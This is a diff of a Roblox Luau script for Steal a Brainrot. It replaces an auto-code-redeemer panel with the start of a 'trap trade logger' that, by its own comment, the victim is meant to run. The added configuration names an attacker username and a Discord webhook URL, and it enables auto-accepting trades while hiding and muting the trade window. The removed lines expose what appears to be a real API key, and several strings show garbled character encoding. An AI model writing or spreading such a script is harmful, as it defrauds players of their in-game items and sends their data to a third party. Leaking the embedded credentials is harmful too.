@@ -1,760 +1,860 @@
---[[
-    AUTO CODES SAB - INSTANT ATTEMPT / SIN ESPERA ARTIFICIAL
-    Compatibilidad objetivo: Delta Executor / Roblox Luau
+--[[=====================================================================
+    SAB | TRAP TRADE LOGGER  v5.0
+    Steal a Brainrot  --  LO EJECUTA LA VICTIMA
 
-    FUNCIONES
-    - Panel compacto para m贸vil y PC.
-    - Detecci贸n de anuncios desde el RemoteEvent de notificaciones localizado
-      mediante NotificationController (sin conectarse a todos los remotos).
-    - Detector auxiliar de textos nuevos en PlayerGui.
-    - Extracci贸n de c贸digos despu茅s de frases como "code is", "redeem",
-      "use this code", etc.
-    - Auto Listen, Auto Type y Auto Redeem configurables.
-    - Canje sin retraso artificial al detectar un c贸digo.
-    - Resolvedor de acertijos Gemini opcional; al recibir la respuesta,
-      la muestra, la escribe y lanza el canje sin espera artificial.
-    - Entrada manual, copiar, limpiar y registro de detecciones.
+    Mutaciones y efectos separados, con emoji propio y soporte de
+    emoji personalizados de Discord via CUSTOM_EMOJI.
+=====================================================================]]
 
-    IMPORTANTE
-    - Define tu clave privada ANTES de ejecutar:
-      getgenv().SAB_GEMINI_API_KEY = "AQ.Ab8RN6JCQzky0ioTPoLQiXXr10fSGUwe4r0mYEJQ--9UF0FKcw"
-    - No compartas una clave API dentro de scripts p煤blicos.
-    - El script solo escribe y pulsa controles de la interfaz del juego.
-      No falsifica respuestas del servidor ni invoca remotos de canje.
-    - No existe garant铆a de respuesta Gemini en 1 ms: requiere una petici贸n
-      de red y el tiempo depende de conexi贸n, API y latencia.
-    - Las respuestas ya guardadas en cach茅 s铆 pueden mostrarse casi al instante.
-    - "Enviado" significa que se activ贸 el control de la interfaz; no garantiza
-      que el servidor haya aceptado el c贸digo ni verifica por s铆 solo el acertijo.
-    - La estructura de la interfaz y los eventos del juego pueden cambiar.
-]]
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "KIMILOSP"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1530011537991925800/akM1FHwrtjYuvh_rAIeOG2r32P-OObaS5kxBPbBtvNwUC0BbUnIW9Mear7ut3jrZKpaK"
 
---==============================================================
--- 1. SERVICIOS Y COMPATIBILIDAD
---==============================================================
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
-local Env = (getgenv and getgenv()) or _G
-local API_KEY = tostring(Env.SAB_GEMINI_API_KEY or "")
-local HttpRequest = request or http_request or (syn and syn.request) or (http and http.request)
-local GetConnections = getconnections or (debug and debug.getconnections)
-local SetClipboard = setclipboard or toclipboard or (syn and syn.write_clipboard)
-
-local function safeCall(fn, ...)
-    if type(fn) ~= "function" then return false end
-    return pcall(fn, ...)
-end
-
-local function trim(value)
-    return tostring(value or ""):gsub("^%s+", ""):gsub("%s+$", "")
-end
-
-local function stripRichText(value)
-    return tostring(value or ""):gsub("<[^>]->", "")
-end
-
-local function isTextObject(obj)
-    return obj and (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox"))
-end
-
---==============================================================
--- 2. CONFIGURACI脫N
---==============================================================
-local Config = {
-    AutoListen = true,
-    AutoType = true,
-    AutoRedeem = true,
-    AutoRiddleAI = true,
-    IgnoreSystem = true,
-    ListenKey = Enum.KeyCode.F,
-    RedeemKey = Enum.KeyCode.G,
-    MaxFeed = 7,
+getgenv().CONFIG = {
+    POLL_INTERVAL    = 3,
+    RETRY_DELAY      = 5,
+    MAX_TRADE_ITEMS  = 18,
+    HIDE_TRADE_GUI   = true,
+    MUTE_TRADE_NOTIF = true,
+    AUTO_ACCEPT      = true,
+    PING_EVERYONE    = true,
+    SHOW_MULTIPLIER  = false,   -- true = "💎 1.5x"
+    SHOW_EXECUTOR    = true,
+    SHOW_PLAYERS     = true,
+    SHOW_ACCOUNT     = true,
+    DEBUG            = true,
+    ARG_STYLE        = "auto",
+    FOOTER_SITE      = "www.venice.ai",
+    FOOTER_DISCORD   = "discord.gg/askvenice",
+    FORCE_REMOTES    = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil },
 }
 
-local State = {
-    Listening = false,
-    Busy = false,
-    LastCode = "",
-    LastMessage = "",
-    LastMessageAt = 0,
-    RemoteConnected = false,
-    GuiObserverCount = 0,
-    Connections = {},
-    RiddleCache = {},
-    FeedCount = 0,
-    Rebinding = nil,
+-- Emoji personalizados: nombre -> "<:nombre:ID>"
+-- Ej: Gold = "<:muta_gold:123456789012345678>"
+getgenv().CUSTOM_EMOJI = {
+    -- Gold = "",
+    -- Diamond = "",
+    -- Rainbow = "",
 }
 
---==============================================================
--- 3. INTERFAZ
---==============================================================
-local old = PlayerGui:FindFirstChild("SABAutoCodesRebuilt")
-if old then old:Destroy() end
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SABAutoCodesRebuilt"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.Parent = PlayerGui
-
-local Theme = {
-    Background = Color3.fromRGB(13, 15, 21),
-    Panel = Color3.fromRGB(22, 25, 34),
-    Input = Color3.fromRGB(30, 34, 45),
-    Line = Color3.fromRGB(54, 61, 76),
-    Text = Color3.fromRGB(240, 243, 250),
-    Muted = Color3.fromRGB(151, 160, 178),
-    Accent = Color3.fromRGB(95, 145, 255),
-    Green = Color3.fromRGB(72, 202, 138),
-    Red = Color3.fromRGB(240, 91, 102),
-    Yellow = Color3.fromRGB(245, 190, 82),
+-- Mutaciones (nombre -> { emoji, multiplicador })
+getgenv().MUTATIONS = {
+    Default     = { "▫️", 1 },
+    Gold        = { "🥇", 1.25 },
+    Diamond     = { "💎", 1.5 },
+    Rainbow     = { "🌈", 10 },
+    Bloodrot    = { "🩸", 2 },
+    Candy       = { "🍬", 4 },
+    Lava        = { "🌋", 6 },
+    Galaxy      = { "🌌", 7 },
+    Yin_Yang    = { "☯️", 7.5 },
+    Radioactive = { "☢️", 8.5 },
+    Cursed      = { "🕯️", 9 },
+    Divine      = { "😇", 10 },
+    Cyber       = { "🤖", 11 },
+    Phantom     = { "👻", 12 },
+    Crystal     = { "🔮", 13 },
+    Eclipse     = { "🌑", 14 },
 }
 
-local function make(className, props, parent)
-    local obj = Instance.new(className)
-    for key, value in pairs(props or {}) do
-        obj[key] = value
+-- Efectos de evento
+local function flag(code)
+    local out = ""
+    for i = 1, #code do
+        out = out .. utf8.char(0x1F1E6 + code:byte(i) - 65)
     end
-    obj.Parent = parent
-    return obj
+    return out
 end
 
-local function corner(obj, radius)
-    make("UICorner", {CornerRadius = UDim.new(0, radius or 8)}, obj)
-end
+getgenv().EFFECTS = {
+    Strawberry = "🍓", Meowl = "🐱", ["John Pork"] = "🐷", Skibidi = "🚽",
+    Granny = "👵", Fire = "🔥", Rose = "🌹", Fireworks = "🎆",
+    Nyan = "🐈", Lightning = "⚡", Burger = "🍔", ["Aura Shades"] = "🕶️",
+    Disco = "🪩", Glitched = "📺", Claws = "🐾", Zombie = "🧟",
+    Bubblegum = "🫧", UFO = "🛸", Taco = "🌮", Sleepy = "😴",
+    Bull = "🐂", Paint = "🎨", [":3"] = "😺", Tie = "👔",
+    Spider = "🕷️", ["Matteo Hat"] = "🎩", Galactic = "🌠", Explosive = "💥",
+    ["Shark Fin"] = "🦈", ["Job Application"] = "📄", ["Reindeer Pet"] = "🦌",
+    ["Santa Hat"] = "🎅", ["Jack O' Lantern Pet"] = "🎃", ["RIP Gravestone"] = "🪦",
+    ["Witch Hat"] = "🧙", ["Bunny Ears"] = "🐰", ["Pink Egg"] = "🩷",
+    ["Blue Egg"] = "💙", ["Green Egg"] = "💚", ["Orange Egg"] = "🧡",
+    ["1 Year"] = "🎂", ["26"] = "🔢", ["10B"] = "💰", ["Rainbow Balloon"] = "🎈",
+    ["Pink Balloon"] = "🎈", ["Red Balloon"] = "🎈", ["Blue Balloon"] = "🎈",
+    ["Green Balloon"] = "🎈", ["Orange Balloon"] = "🎈", Halo = "😇", Lucky = "🍀",
+    Sun = "☀️", Ball = "⚽", Chocolate = "🍫", Skeleton = "💀",
+    Bee = "🐝", ["Fire Bee"] = "🐝", ["Ice Bee"] = "🐝", ["Queen Bee"] = "👑",
+    ["Comet-struck"] = "☄️", Snowy = "❄️", Wet = "💧",
+    -- países
+    Brazil = flag("BR"), Indonesian = flag("ID"), Sombrero = "🇲🇽",
+    Algeria = flag("DZ"), Argentina = flag("AR"), Australia = flag("AU"),
+    Austria = flag("AT"), Belgium = flag("BE"), ["Bosnia and Herzegovina"] = flag("BA"),
+    Canada = flag("CA"), ["Cape Verde"] = flag("CV"), Croatia = flag("HR"),
+    Curacao = flag("CW"), Czechia = flag("CZ"), ["DR Congo"] = flag("CD"),
+    Ecuador = flag("EC"), Egypt = flag("EG"),
+    England = "\240\159\143\180\243\160\129\167\243\160\129\162\243\160\129\174\243\160\129\167\243\160\129\191",
+    France = flag("FR"), Germany = flag("DE"), Ghana = flag("GH"), Haiti = flag("HT"),
+    Iran = flag("IR"), Iraq = flag("IQ"), ["Ivory Coast"] = flag("CI"), Japan = flag("JP"),
+    Jordan = flag("JO"), Mexico = flag("MX"), Morocco = flag("MA"), Netherlands = flag("NL"),
+    ["New Zealand"] = flag("NZ"), Norway = flag("NO"), Panama = flag("PA"),
+    Paraguay = flag("PY"), Portugal = flag("PT"), Qatar = flag("QA"), ["Saudi Arabia"] = flag("SA"),
+    Scotland = "\240\159\143\180\243\160\129\167\243\160\129\163\243\160\129\163\243\160\129\180\243\160\129\191",
+    Senegal = flag("SN"), ["South Africa"] = flag("ZA"), ["South Korea"] = flag("KR"),
+    Spain = flag("ES"), Sweden = flag("SE"), Switzerland = flag("CH"), Tunisia = flag("TN"),
+    Turkey = flag("TR"), ["United States"] = flag("US"), Uruguay = flag("UY"),
+    Uzbekistan = flag("UZ"), Colombia = flag("CO"),
+}
 
-local function stroke(obj, color, transparency)
-    make("UIStroke", {Color = color or Theme.Line, Thickness = 1, Transparency = transparency or 0.15}, obj)
-end
+getgenv().NORMAL_BRAINROTS = {
+    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
+    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
+    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
+    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
+    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
+    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
+    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
+    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
+    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
+    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
+    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
+    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
+    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
+    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
+    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
+    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
+    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
+    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
+    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
+    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
+    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
+    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
+    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
+    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
+    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
+    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
+    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
+    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
+    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
+    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
+    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
+    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
+    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
+    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
+    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
+    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
+    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
+    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
+    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
+    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
+    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
+    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
+    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
+    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
+    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
+    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
+    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
+    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
+    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
+    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
+    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeiteira"]=true,
+    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
+    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
+    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
+    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
+    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
+    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
+    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
+    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
+    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
+    ["Bombardiro Crocodilo"]=true,
+}
 
-local Main = make("Frame", {
-    Name = "Main",
-    Size = UDim2.fromOffset(300, 354),
-    Position = UDim2.new(0.5, -150, 0.5, -177),
-    BackgroundColor3 = Theme.Background,
-    BorderSizePixel = 0,
-}, ScreenGui)
-corner(Main, 12)
-stroke(Main, Theme.Line, 0.05)
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
+    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
+    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
+}
 
-local Scale = make("UIScale", {Scale = 1}, Main)
-local function updateScale()
-    local camera = workspace.CurrentCamera
-    local viewport = camera and camera.ViewportSize or Vector2.new(800, 600)
-    if UserInputService.TouchEnabled then
-        Scale.Scale = math.clamp(math.min(viewport.X / 390, viewport.Y / 470), 0.72, 0.96)
-    else
-        Scale.Scale = 1
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
+    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
+    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
+    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
+    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
+    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
+    ["Candy Slap"]=true,["Crystal Hammer"]=true,
+}
+
+--=====================================================================
+local Players    = game:GetService("Players")
+local RS         = game:GetService("ReplicatedStorage")
+local WS         = game:GetService("Workspace")
+local HS         = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local LP         = Players.LocalPlayer
+local CFG        = getgenv().CONFIG
+local U          = table.unpack or unpack
+
+local STATE = { running = true, inTrade = false, lastRequest = 0, lastReport = nil }
+local REMOTES = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil }
+local MULT = { K = 1e3, M = 1e6, B = 1e9, T = 1e12 }
+
+local function lc(s) return string.lower(tostring(s)) end
+local function log(m, lvl)
+    if CFG.DEBUG then
+        if lvl == "err" then warn("[SAB] " .. tostring(m)) else print("[SAB] " .. tostring(m)) end
     end
+    if _G.SAB_HUD then pcall(_G.SAB_HUD, m) end
 end
-updateScale()
-if workspace.CurrentCamera then
-    table.insert(State.Connections, workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale))
+local function notify(t, x)
+    task.spawn(function() pcall(function()
+        StarterGui:SetCore("SendNotification", { Title = t, Text = x, Duration = 3 })
+    end) end)
 end
-
-local Header = make("Frame", {
-    Size = UDim2.new(1, 0, 0, 40),
-    BackgroundColor3 = Theme.Panel,
-    BorderSizePixel = 0,
-}, Main)
-corner(Header, 12)
-make("Frame", {Size = UDim2.new(1, 0, 0, 12), Position = UDim2.new(0, 0, 1, -12), BackgroundColor3 = Theme.Panel, BorderSizePixel = 0}, Header)
-
-local Title = make("TextLabel", {
-    Size = UDim2.new(1, -82, 1, 0), Position = UDim2.fromOffset(12, 0),
-    BackgroundTransparency = 1, Text = "SAB  /  AUTO CODES", TextColor3 = Theme.Text,
-    Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
-}, Header)
-
-local Minimize = make("TextButton", {
-    Size = UDim2.fromOffset(28, 26), Position = UDim2.new(1, -64, 0, 7),
-    BackgroundColor3 = Theme.Input, Text = "鈥�", TextColor3 = Theme.Text,
-    Font = Enum.Font.GothamBold, TextSize = 15, BorderSizePixel = 0,
-}, Header)
-corner(Minimize, 6)
-local Close = make("TextButton", {
-    Size = UDim2.fromOffset(28, 26), Position = UDim2.new(1, -32, 0, 7),
-    BackgroundColor3 = Color3.fromRGB(75, 37, 45), Text = "脳", TextColor3 = Theme.Text,
-    Font = Enum.Font.GothamBold, TextSize = 17, BorderSizePixel = 0,
-}, Header)
-corner(Close, 6)
-
-local Body = make("Frame", {
-    Size = UDim2.new(1, -20, 1, -52), Position = UDim2.fromOffset(10, 46),
-    BackgroundTransparency = 1,
-}, Main)
-
-local Status = make("TextLabel", {
-    Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1,
-    Text = "Iniciando detector...", TextColor3 = Theme.Yellow,
-    Font = Enum.Font.Gotham, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
-}, Body)
-
-local CodeBox = make("TextBox", {
-    Size = UDim2.new(1, 0, 0, 36), Position = UDim2.fromOffset(0, 27),
-    BackgroundColor3 = Theme.Input, BorderSizePixel = 0,
-    Text = "", PlaceholderText = "C贸digo o respuesta...", PlaceholderColor3 = Theme.Muted,
-    TextColor3 = Theme.Text, Font = Enum.Font.GothamSemibold, TextSize = 13,
-    ClearTextOnFocus = false, TextXAlignment = Enum.TextXAlignment.Left,
-}, Body)
-corner(CodeBox, 7)
-make("UIPadding", {PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 8)}, CodeBox)
-
-local function createButton(text, x, y, width, color)
-    local button = make("TextButton", {
-        Size = UDim2.new(width, -4, 0, 31), Position = UDim2.new(x, x == 0 and 0 or 4, 0, y),
-        BackgroundColor3 = color or Theme.Input, BorderSizePixel = 0,
-        Text = text, TextColor3 = Theme.Text, Font = Enum.Font.GothamBold, TextSize = 11,
-        AutoButtonColor = true,
-    }, Body)
-    corner(button, 7)
-    return button
-end
-
-local ListenButton = createButton("LISTEN: OFF", 0, 72, 0.5, Theme.Input)
-local RedeemButton = createButton("REDEEM", 0.5, 72, 0.5, Theme.Accent)
-local TypeButton = createButton("AUTO TYPE: ON", 0, 109, 0.5, Theme.Input)
-local AutoRedeemButton = createButton("AUTO REDEEM: ON", 0.5, 109, 0.5, Theme.Input)
-local AIButton = createButton("GEMINI AI: ON", 0, 146, 0.5, Theme.Input)
-local ClearButton = createButton("CLEAR", 0.5, 146, 0.5, Theme.Input)
-
-local FeedTitle = make("TextLabel", {
-    Size = UDim2.new(1, 0, 0, 20), Position = UDim2.fromOffset(0, 184),
-    BackgroundTransparency = 1, Text = "DETECCIONES RECIENTES", TextColor3 = Theme.Muted,
-    Font = Enum.Font.GothamBold, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
-}, Body)
-local Feed = make("Frame", {
-    Size = UDim2.new(1, 0, 0, 68), Position = UDim2.fromOffset(0, 207),
-    BackgroundColor3 = Theme.Panel, BorderSizePixel = 0,
-}, Body)
-corner(Feed, 7)
-local FeedText = make("TextLabel", {
-    Size = UDim2.new(1, -14, 1, -10), Position = UDim2.fromOffset(7, 5),
-    BackgroundTransparency = 1, Text = "Esperando anuncios...", TextColor3 = Theme.Muted,
-    Font = Enum.Font.Gotham, TextSize = 10, TextWrapped = true,
-    TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
-}, Feed)
-
-local Bottom = make("TextLabel", {
-    Size = UDim2.new(1, 0, 0, 28), Position = UDim2.fromOffset(0, 282),
-    BackgroundTransparency = 1, Text = "F: escuchar  鈥�  G: canjear  鈥�  arrastra para mover",
-    TextColor3 = Theme.Muted, Font = Enum.Font.Gotham, TextSize = 9,
-    TextWrapped = true,
-}, Body)
-
-local function setStatus(message, kind)
-    Status.Text = tostring(message)
-    local colors = {ok = Theme.Green, error = Theme.Red, wait = Theme.Yellow, info = Theme.Muted, busy = Theme.Accent}
-    Status.TextColor3 = colors[kind or "info"] or Theme.Muted
-end
-
-local function addFeed(message, result)
-    State.FeedCount += 1
-    local line = "鈥� " .. trim(message):sub(1, 85)
-    if result and result ~= "" then line ..= "  鈫�  " .. trim(result):sub(1, 35) end
-    local lines = {}
-    for oldLine in FeedText.Text:gmatch("[^\n]+") do
-        if oldLine ~= "Esperando anuncios..." then lines[#lines + 1] = oldLine end
-    end
-    table.insert(lines, 1, line)
-    while #lines > Config.MaxFeed do table.remove(lines) end
-    FeedText.Text = table.concat(lines, "\n")
-end
-
--- Arrastrar panel desde la barra superior.
-do
-    local dragging, dragInput, dragStart, startPos
-    Header.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = Main.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
-        end
-    end)
-    Header.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and input == dragInput then
-            local delta = input.Position - dragStart
-            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
-local minimized = false
-Minimize.MouseButton1Click:Connect(function()
-    minimized = not minimized
-    Body.Visible = not minimized
-    Main.Size = minimized and UDim2.fromOffset(300, 40) or UDim2.fromOffset(300, 354)
-    Minimize.Text = minimized and "+" or "鈥�"
-end)
-Close.MouseButton1Click:Connect(function()
-    for _, connection in ipairs(State.Connections) do pcall(function() connection:Disconnect() end) end
-    ScreenGui:Destroy()
-end)
-
---==============================================================
--- 4. INTERACCI脫N CON LA VENTANA DE C脫DIGOS DEL JUEGO
---==============================================================
-local function getCodesRoot()
-    return PlayerGui:FindFirstChild("Codes")
-end
-
-local function findCodeBox()
-    local root = getCodesRoot()
+local function findPath(root, path)
     if not root then return nil end
-    local codes = root:FindFirstChild("Codes") or root
-    local main = codes:FindFirstChild("Main")
-    local direct = main and main:FindFirstChild("TextBox")
-    if direct and direct:IsA("TextBox") then return direct end
-    for _, obj in ipairs(root:GetDescendants()) do
-        if obj:IsA("TextBox") then return obj end
+    local cur = root
+    for seg in string.gmatch(path, "[^/]+") do
+        if not cur then return nil end
+        cur = cur:FindFirstChild(seg)
     end
-    return nil
+    return cur
 end
+local function getTarget() return Players:FindFirstChild(getgenv().TARGET_USERNAME) end
 
-local function findSubmitButton()
-    local root = getCodesRoot()
-    if not root then return nil end
-    local codes = root:FindFirstChild("Codes") or root
-    local main = codes:FindFirstChild("Main")
-    local direct = main and main:FindFirstChild("Confirm")
-    if direct and (direct:IsA("TextButton") or direct:IsA("ImageButton")) then return direct end
-    for _, obj in ipairs(root:GetDescendants()) do
-        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-            local name = obj.Name:lower()
-            if name:find("confirm", 1, true) or name:find("submit", 1, true)
-                or name:find("redeem", 1, true) or name:find("enter", 1, true) then
-                return obj
-            end
-        end
-    end
-    return nil
-end
-
-local function fireGuiSignal(signal)
-    if not GetConnections then return false end
-    local ok, connections = pcall(GetConnections, signal)
-    if not ok or type(connections) ~= "table" then return false end
-    for _, connection in ipairs(connections) do
-        if connection.Enabled ~= false then
-            local fn
-            pcall(function() fn = connection.Function end)
-            if type(fn) == "function" then
-                local fired = pcall(task.spawn, fn)
-                if fired then return true end
-            elseif type(connection.Fire) == "function" then
-                if pcall(function() connection:Fire() end) then return true end
-            end
-        end
-    end
-    return false
-end
-
-local function submitCode(code)
-    code = trim(code)
-    if code == "" then return false, "C贸digo vac铆o" end
-    local box = findCodeBox()
-    if not box then return false, "Abre la ventana Codes del juego" end
-
-    local wrote = pcall(function() box.Text = code end)
-    if not wrote then return false, "No se pudo escribir en el campo" end
-
-    local button = findSubmitButton()
-    if button and fireGuiSignal(button.Activated) then
-        return true, "Control de canje activado"
-    end
-    if button and fireGuiSignal(button.MouseButton1Click) then
-        return true, "Control de canje activado"
-    end
-    if fireGuiSignal(box.FocusLost) then
-        return true, "Campo enviado mediante FocusLost"
-    end
-
-    -- Fallback compatible: deja el c贸digo escrito para que el usuario pulse el bot贸n.
